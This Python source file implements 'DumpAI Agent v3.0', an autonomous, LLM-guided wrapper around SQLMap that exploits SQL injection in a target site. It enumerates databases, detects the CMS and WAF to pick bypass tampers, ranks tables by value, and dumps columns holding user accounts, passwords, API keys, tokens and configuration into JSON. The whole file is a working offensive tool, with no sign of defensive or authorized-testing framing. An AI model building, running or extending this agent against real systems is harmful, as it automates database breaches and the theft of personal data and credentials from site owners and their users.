"""
DumpAI Agent v3.0 - Full AI Integration

This is a complete rewrite following hackingBuddyGPT patterns:
- AI makes decisions at EVERY stage (not just CMS detection)
- Reason → Act → Observe → Adapt cycle
- Dynamic strategy adaptation
- Intelligent error recovery

Unlike v2.x which used hardcoded phases with optional AI,
v3 is AI-first: the Planner controls all decisions.
"""
import json
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any, Dict, List, Optional

try:
    from .memory import Memory
    from .planner import Planner, ActionType, Observation, Decision
    from .strategy import StrategyManager, Strategy
    from .tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns
    )
    from .cms_strategies import (
        detect_cms_from_tables, get_extraction_plan, detect_prefix, get_cms_info
    )
except ImportError:
    from memory import Memory
    from planner import Planner, ActionType, Observation, Decision
    from strategy import StrategyManager, Strategy
    from tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns
    )
    from cms_strategies import (
        detect_cms_from_tables, get_extraction_plan, detect_prefix, get_cms_info
    )


BANNER = """
░█▀▄░█░█░█▄█░█▀█░█▀█░▀█▀
░█░█░█░█░█░█░█▀▀░█▀█░░█░
░▀▀░░▀▀▀░▀░▀░▀░░░▀░▀░▀▀▀

  AI-Powered Autonomous Agent
  v3.0 - Full AI Integration
  
  hackingBuddyGPT-inspired architecture
"""


class DumpAgentV3:
    """
    DumpAI Agent v3.0 - Full AI Integration
    
    Architecture (inspired by hackingBuddyGPT):
    - Planner: Central AI brain for all decisions
    - StrategyManager: Adaptive strategy selection
    - Memory: Full context for AI reasoning
    - Tools: Action executors
    
    Flow:
    1. INIT: Parse config, initialize components
    2. DISCOVERY: AI analyzes injection, discovers DB/tables
    3. PRIORITIZATION: AI scores tables by value
    4. EXTRACTION: AI guides targeted extraction
    5. ADAPTATION: AI handles errors, changes strategy
    """
    
    def __init__(self, command: str, categories: Optional[List[str]] = None,
                 output_dir: str = "dumpai_out", max_parallel: int = 5,
                 verbose: bool = False, max_rows: int = 0,
                 cms_override: str = None, prefix_override: str = None):
        
        self.config = self._parse_command(command)
        self.categories = categories or ["user_data", "api_key", "sys_data"]
        self.output_dir = output_dir
        self.max_parallel = max_parallel
        self.verbose = verbose
        self.max_rows = max_rows
        self.cms_override = cms_override
        self.prefix_override = prefix_override
        
        os.makedirs(output_dir, exist_ok=True)
        
        self.memory = Memory()
        self.memory.current_database = self.config.get("database", "")
        
        self.planner = Planner(verbose=verbose)
        self.strategy_manager = StrategyManager(
            planner=self.planner,
            memory=self.memory,
            verbose=verbose
        )
        
        self._init_tools()
        
        self.round_num = 0
        self.max_rounds = 200
    
    def _parse_command(self, cmd: str) -> Dict:
        """Parse SQLMap command."""
        config = {
            "base_cmd": cmd,
            "database": "",
            "request_file": "",
            "parameter": ""
        }
        
        d_match = re.search(r'-D\s+(\S+)', cmd)
        if d_match:
            config["database"] = d_match.group(1)
        
        r_match = re.search(r'-r\s+["\']?([^"\'\s]+)["\']?', cmd)
        if r_match:
            config["request_file"] = r_match.group(1)
        
        p_match = re.search(r'-p\s+["\']?([^"\'\s]+)["\']?', cmd)
        if p_match:
            config["parameter"] = p_match.group(1)
        
        return config
    
    def _init_tools(self):
        """Initialize all tools."""
        self.tools = {
            "enumerate_dbs": EnumerateDBs(self.config, verbose=self.verbose),
            "enumerate_tables": EnumerateTables(self.config, verbose=self.verbose),
            "get_columns": GetColumns(self.config, verbose=self.verbose),
            "search_tables": SearchTables(self.config, verbose=self.verbose),
            "search_columns": SearchColumns(self.config, verbose=self.verbose),
            "dump_table": DumpTable(self.config, verbose=self.verbose),
            "dump_columns": DumpColumns(self.config, verbose=self.verbose),
            "analyze_schema": AnalyzeSchema(self.config, verbose=self.verbose),
            "analyze_columns": AnalyzeColumns(self.config, verbose=self.verbose)
        }
    
    def _log(self, msg: str, level: str = "INFO"):
        """Log with timestamp."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {
            "INFO": "+", "AI": "*", "SUCCESS": "+", 
            "ERROR": "!", "PHASE": "=", "DATA": ">"
        }
        symbol = symbols.get(level, "+")
        print(f"[{timestamp}] [{symbol}] {msg}")
    
    def _phase_header(self, title: str):
        """Print phase header."""
        print()
        print("=" * 60)
        print(f"  {title}")
        print("=" * 60)
    
    def _execute_tool(self, tool_name: str, **params) -> Optional[Any]:
        """Execute a tool and record in memory."""
        tool = self.tools.get(tool_name)
        if not tool:
            self._log(f"Unknown tool: {tool_name}", "ERROR")
            return None
        
        if self.verbose:
            self._log(f"Executing: {tool_name}", "INFO")
        
        result = tool.execute(**params)
        
        self.memory.add_action(
            tool=tool_name,
            params=params,
            result=result.data if result.success else None,
            success=result.success,
            execution_time=result.execution_time
        )
        
        if not result.success and result.error:
            self.memory.add_error(tool_name, result.error, params)
            
            config, adaptation = self.strategy_manager.adapt_to_error(
                error=result.error,
                failed_tool=tool_name
            )
            
            if adaptation.get("strategy_change"):
                self._log(f"Strategy changed to: {adaptation['strategy_change']}", "AI")
        else:
            self.strategy_manager.report_success()
        
        return result
    
    def run(self):
        """Main agent loop - AI-controlled execution."""
        print(BANNER)
        start_time = time.time()
        
        self._phase_header("AUTONOMOUS AI AGENT")
        self._log(f"Request: {self.config['request_file']}")
        self._log(f"Categories: {', '.join(self.categories)}")
        self._log(f"Output: {self.output_dir}")
        print()
        
        self._phase_header("PHASE 1: INJECTION ANALYSIS")
        
        database = self.config.get("database")
        
        result = self._execute_tool("enumerate_dbs")
        
        if not result or not result.success:
            self._log("Failed to probe target", "ERROR")
            return
        
        injection_analysis = self.planner.analyze_injection(result.raw_output)
        
        self.memory.injection_type = injection_analysis.get("injection_type", "unknown")
        self._log(f"Injection: {self.memory.injection_type}", "AI")
        
        if injection_analysis.get("is_slow"):
            self._log("Slow injection detected - AI will optimize queries", "AI")
        
        if injection_analysis.get("waf_detected"):
            self._log("WAF detected - AI will select bypass tampers", "AI")
        
        self.memory.add_hypothesis(
            type="injection",
            value=self.memory.injection_type,
            confidence=0.9 if injection_analysis else 0.5,
            source="planner.analyze_injection"
        )
        
        self.strategy_manager.select_initial_strategy(injection_analysis)
        
        self._phase_header("PHASE 2: DATABASE SELECTION")
        
        if not database:
            if result.data:
                self.memory.databases = result.data
                
                system_dbs = {'information_schema', 'mysql', 'performance_schema', 'sys', 'test'}
                user_dbs = [db for db in result.data if db.lower() not in system_dbs]
                
                if user_dbs:
                    database = user_dbs[0]
                    self._log(f"AI selected database: {database}", "AI")
                else:
                    database = result.data[0]
                    self._log(f"Using database: {database}", "INFO")
                
                self.memory.current_database = database
        else:
            self._log(f"Database specified: {database}", "INFO")
            self.memory.current_database = database
        
        self._phase_header("PHASE 3: TABLE DISCOVERY")
        
        use_smart_search = (
            injection_analysis.get("is_slow") or 
            self.strategy_manager.current_strategy == Strategy.SMART_SEARCH
        )
        
        if use_smart_search:
            self._log("AI using Smart Search (optimized for slow injection)", "AI")
            tables = self._smart_search_tables(database)
        else:
            self._log("Full table enumeration", "INFO")
            result = self._execute_tool("enumerate_tables", database=database)
            tables = result.data if result and result.success else []
        
        if not tables:
            self._log("No tables found", "ERROR")
            return
        
        self.memory.tables = tables
        self._log(f"Discovered {len(tables)} tables", "SUCCESS")
        
        self._phase_header("PHASE 4: AI CMS DETECTION & PRIORITIZATION")
        
        if self.cms_override:
            cms_detected = self.cms_override.lower()
            self._log(f"CMS override: {cms_detected}", "INFO")
        else:
            cms_detected = detect_cms_from_tables(tables)
        
        if cms_detected:
            self.memory.cms_detected = cms_detected
            self._log(f"CMS detected: {cms_detected}", "AI")
            
            self.strategy_manager.adapt_to_cms(cms_detected)
            
            self.memory.add_hypothesis(
                type="cms",
                value=cms_detected,
                confidence=0.95,
                source="cms_strategies.detect_cms"
            )
            
            prefix = self.prefix_override or detect_prefix(tables, cms_detected)
            self._log(f"Table prefix: {prefix}", "INFO")
            
            cms_plan = get_extraction_plan(cms_detected, prefix, self.categories)
            
            if cms_plan:
                self._log(f"CMS strategy: {len(cms_plan)} target tables", "AI")
                extraction_plan = cms_plan
            else:
                extraction_plan = None
        else:
            extraction_plan = None
        
        if not extraction_plan:
            self._log("Using AI table prioritization", "AI")
            
            prioritized = self.planner.prioritize_tables(
                tables=tables,
                categories=self.categories,
                cms_detected=self.memory.cms_detected,
                context=self.memory.get_context_for_ai()
            )
            
            extraction_plan = {}
            for item in prioritized[:20]:
                table = item["table"]
                self.memory.update_table_score(table, item["score"])
                extraction_plan[table] = item.get("columns_hint", [])
        
        if not extraction_plan:
            self._log("No extraction targets identified", "ERROR")
            return
        
        self._phase_header("PHASE 5: AI-GUIDED EXTRACTION")
        
        total_rows = 0
        
        for table, suggested_cols in extraction_plan.items():
            self._log(f"Processing: {table}", "INFO")
            self.round_num += 1
            
            if self.round_num > self.max_rounds:
                self._log("Max rounds reached", "ERROR")
                break
            
            col_result = self._execute_tool("get_columns", database=database, table=table)
            
            if not col_result or not col_result.success:
                dump_result = self._execute_tool(
                    "dump_table", database=database, table=table, max_rows=self.max_rows
                )
                if dump_result and dump_result.success and dump_result.data:
                    self._add_extracted_data(table, dump_result.data)
                    total_rows += len(dump_result.data)
                continue
            
            all_columns = col_result.data
            self.memory.columns_cache[table] = all_columns
            
            column_selection = self.planner.select_extraction_columns(
                table=table,
                columns=all_columns,
                categories=self.categories,
                context=self.memory.get_context_for_ai()
            )
            
            if column_selection and column_selection.get("extractions"):
                for ext in column_selection["extractions"]:
                    cols = ext.get("columns", [])
                    category = ext.get("category", "")
                    
                    if not cols:
                        continue
                    
                    valid_cols = [c for c in cols if c in all_columns]
                    if not valid_cols:
                        continue
                    
                    self._log(f"  -> Extracting {valid_cols} for {category}", "AI")
                    
                    dump_result = self._execute_tool(
                        "dump_columns",
                        database=database,
                        table=table,
                        columns=valid_cols,
                        max_rows=self.max_rows
                    )
                    
                    if dump_result and dump_result.success and dump_result.data:
                        self._add_extracted_data(table, dump_result.data, category)
                        total_rows += len(dump_result.data)
                        self._log(f"  -> Extracted {len(dump_result.data)} rows", "DATA")
            else:
                if suggested_cols:
                    cols = [c for c in suggested_cols if c in all_columns]
                else:
                    cols = all_columns[:10]
                
                if cols:
                    dump_result = self._execute_tool(
                        "dump_columns",
                        database=database,
                        table=table,
                        columns=cols,
                        max_rows=self.max_rows
                    )
                    
                    if dump_result and dump_result.success and dump_result.data:
                        self._add_extracted_data(table, dump_result.data)
                        total_rows += len(dump_result.data)
            
            self.memory.stats["tables_processed"] += 1
        
        self._phase_header("EXTRACTION COMPLETE")
        
        self.memory.stats["duration"] = time.time() - start_time
        self._save_results()
        
        self._print_summary()
    
    def _smart_search_tables(self, database: str) -> List[str]:
        """AI-optimized Smart Search for slow injections."""
        patterns = self._get_search_patterns()
        
        self._log(f"Searching {len(patterns)} patterns", "INFO")
        
        result = self._execute_tool(
            "search_tables", 
            patterns=patterns,
            parallel=True,
            max_workers=self.max_parallel
        )
        
        if result and result.success and result.data:
            tables = []
            for item in result.data:
                table_name = item.split('.')[-1] if '.' in item else item
                if table_name not in tables:
                    tables.append(table_name)
            return tables
        
        self._log("Smart search failed, falling back to enumeration", "ERROR")
        result = self._execute_tool("enumerate_tables", database=database)
        return result.data if result and result.success else []
    
    def _get_search_patterns(self) -> List[str]:
        """Get search patterns for Smart Search."""
        patterns = set()
        
        category_patterns = {
            "user_data": ["employee", "admin", "user", "staff", "member", "account"],
            "customer_data": ["customer", "client", "address", "order"],
            "sys_data": ["config", "setting", "option", "connection"],
            "api_key": ["api", "key", "token", "oauth", "credential", "webservice"],
            "email_pass": ["user", "member", "account", "login"]
        }
        
        for cat in self.categories:
            if cat in category_patterns:
                patterns.update(category_patterns[cat])
        
        patterns.update(["employee", "shop", "users", "posts", "product", "admin_user"])
        
        return list(patterns)
    
    def _add_extracted_data(self, table: str, rows: List[Dict], 
                            category: str = None):
        """Add extracted data to memory."""
        if not category:
            category = self.categories[0] if self.categories else "user_data"
        
        self.memory.add_extracted_data(category, rows, source_table=table)
    
    def _save_results(self):
        """Save all results."""
        planner_stats = self.planner.get_stats()
        strategy_stats = self.strategy_manager.get_stats()
        
        output = {
            "meta": {
                "session_id": self.memory.session_id,
                "timestamp": datetime.now().isoformat(),
                "version": "3.0",
                "database": self.memory.current_database,
                "cms": self.memory.cms_detected,
                "injection": self.memory.injection_type,
                "duration": self.memory.stats.get("duration", 0),
                "tables_processed": self.memory.stats["tables_processed"],
                "rows_extracted": self.memory.stats["rows_extracted"]
            },
            "ai_stats": {
                "ai_calls": planner_stats["ai_calls"],
                "ai_tokens": planner_stats["total_tokens"],
                "strategy_changes": strategy_stats["strategy_changes"],
                "final_strategy": strategy_stats["current_strategy"]
            },
            "hypotheses": [
                {"type": h.type, "value": h.value, "confidence": h.confidence}
                for h in self.memory.hypotheses
            ],
            "data": self.memory.extracted_data,
            "summary": self.memory.get_summary()
        }
        
        output_file = os.path.join(self.output_dir, "dump_all.json")
        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2, default=str)
        
        self._log(f"Results saved: {output_file}", "SUCCESS")
        
        session_file = os.path.join(self.output_dir, f"session_{self.memory.session_id}.json")
        self.memory.save(session_file)
    
    def _print_summary(self):
        """Print extraction summary."""
        summary = self.memory.get_summary()
        planner_stats = self.planner.get_stats()
        strategy_stats = self.strategy_manager.get_stats()
        
        self._log(f"Duration: {summary['duration']:.1f}s")
        self._log(f"Tables processed: {summary['tables_processed']}")
        self._log(f"Rows extracted: {summary['rows_extracted']}")
        
        print()
        self._log("AI Statistics:", "AI")
        self._log(f"  AI calls: {planner_stats['ai_calls']}")
        self._log(f"  AI tokens: {planner_stats['total_tokens']}")
        self._log(f"  Strategy changes: {strategy_stats['strategy_changes']}")
        self._log(f"  Final strategy: {strategy_stats['current_strategy']}")
        
        if self.memory.hypotheses:
            print()
            self._log("AI Hypotheses:", "AI")
            for h in self.memory.hypotheses:
                self._log(f"  {h.type}: {h.value} ({h.confidence:.0%})")
        
        print()
        for cat, count in summary["data_by_category"].items():
            if count > 0:
                self._log(f"{cat}: {count} records", "DATA")
